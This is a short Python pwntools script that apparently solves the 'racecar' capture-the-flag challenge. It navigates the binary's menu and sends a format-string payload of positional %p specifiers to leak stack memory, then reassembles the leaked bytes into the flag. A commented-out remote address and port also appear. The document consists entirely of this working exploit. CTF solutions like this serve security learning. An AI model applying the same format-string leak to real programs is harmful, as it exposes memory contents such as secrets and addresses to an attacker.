#!/usr/bin/env python3
# coding=utf-8

from pwn import *

#ip   = '94.237.49.166'
#port = 36539
#r = remote(ip, port)
r = process("./racecar")
offset_start = 12
offset_end = offset_start + 11

formatstring = ""
for i in range(offset_start, offset_end):
    formatstring += f"%{i}$p "

r.sendlineafter("Name: ", b"a")
r.sendlineafter("Nickname: ", b"a")
r.sendlineafter("> ", b"2")
r.sendlineafter("> ", b"2")
r.sendlineafter("> ", b"1")

r.sendlineafter("> ", formatstring.encode())
r.recv()
response = r.recv()

raw_hex = (response.decode("utf-8").split("m\n"))[1].replace("0x", "").split()[::-1]
# 拆分8bits為一組
for i in range(len(raw_hex)):
    raw_hex[i] = re.findall('..', raw_hex[i])

# 轉回utf-8
flag = []
for chars in raw_hex:
    word = ""
    for char in chars[::-1]:
        word += chr(int(char, 16))
    flag.append(word)

flag.reverse()
print(''.join(flag))
